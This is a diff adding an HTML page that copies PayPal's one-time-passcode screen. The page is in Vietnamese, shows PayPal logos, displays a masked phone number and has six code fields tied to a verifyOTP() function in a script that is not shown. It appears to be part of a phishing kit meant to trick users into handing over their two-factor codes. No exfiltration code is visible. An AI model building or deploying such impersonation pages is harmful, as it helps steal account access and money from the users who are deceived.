@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PayPal</title>
+    <link rel="stylesheet" href="./otp.css" />
+    <link rel="stylesheet" href="./loader.css" />
+    <link rel="stylesheet" href="./responsive.css" />
+    <link rel="shortcut icon" href="./assets/logo.ico" />
+  </head>
+  <body>
+    <div class="otp-relative">
+      <div class="otp-container">
+        <div class="top">
+          <div class="logo">
+            <img
+              src="./assets/paypal-mark-color.svg"
+              alt="PayPal Logo"
+            />
+          </div>
+
+          <h2 class="enter-code">Nhập mã của bạn</h2>
+          <p class="description">
+            Chúng tôi đã gửi mã bảo mật đến ‪+95 5•• ••2 117‬.
+          </p>
+          <span class="send-new-code">Gửi mã mới </span>
+          <div class="otp-box">
+            <div class="otp-inputs">
+              <input type="text" maxlength="1" class="otp-input" id="otp-1" />
+              <input type="text" maxlength="1" class="otp-input" id="otp-2" />
+              <input type="text" maxlength="1" class="otp-input" id="otp-3" />
+              <input type="text" maxlength="1" class="otp-input" id="otp-4" />
+              <input type="text" maxlength="1" class="otp-input" id="otp-5" />
+              <input type="text" maxlength="1" class="otp-input" id="otp-6" />
+            </div>
+            <p id="message"></p>
+          </div>
+          <button id="submitBtn" onclick="verifyOTP()">Gửi</button>
+          <span class="more-option">Bạn cần thêm lựa chọn?</span>
+        </div>
+      </div>
+      <div class="loading-container" id="loader">
+        <div class="loader"></div>
+      </div>
+      <div class="otp-footer">
+        <span class="bottom more-option">Quay lại phần đăng nhập</span>
+        <ul class="link-group">
+          <li class="link-item">Liên hệ với chúng tôi</li>
+          <li class="link-item">Quyền riêng tư</li>
+          <li class="link-item">Pháp lý</li>
+          <li class="link-item">Toàn cầu</li>
+        </ul>
+      </div>
+    </div>
+    <script src="./otp.js"></script>
+  </body>
+</html>
